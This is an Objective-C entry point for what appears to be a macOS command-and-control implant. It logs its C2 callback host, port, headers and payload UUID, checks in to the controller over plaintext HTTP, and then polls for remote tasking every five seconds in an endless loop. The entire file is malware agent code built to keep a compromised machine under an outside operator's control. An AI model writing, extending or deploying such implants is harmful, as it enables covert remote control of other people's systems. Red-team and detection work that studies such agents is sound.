#import <Foundation/Foundation.h>
#import "HTTPC2Config.h"
#import "SystemInfoHelper.h"
#import "C2CheckIn.h"


int main(int argc, const char * argv[]) {
    @autoreleasepool {
        NSLog(@"C2 Configuration Data:");
        NSLog(@"Callback Host: %@", [HTTPC2Config callbackHost]);
        NSLog(@"Callback Port: %ld", (long)[HTTPC2Config callbackPort]);
        NSLog(@"Headers: %@", [HTTPC2Config headers]);
        NSLog(@"Payload UUID: %@", [HTTPC2Config payloadUUID]);

        /// Perform the HTTP plaintext check-in
        [C2CheckIn performPlaintextCheckin];

        /// Loop to get tasking on an interval -- this will update our tasking
        while (true) {
            [C2CheckIn getTasking];
            [NSThread sleepForTimeInterval:5.0];
        }
    }
    return 0;
}
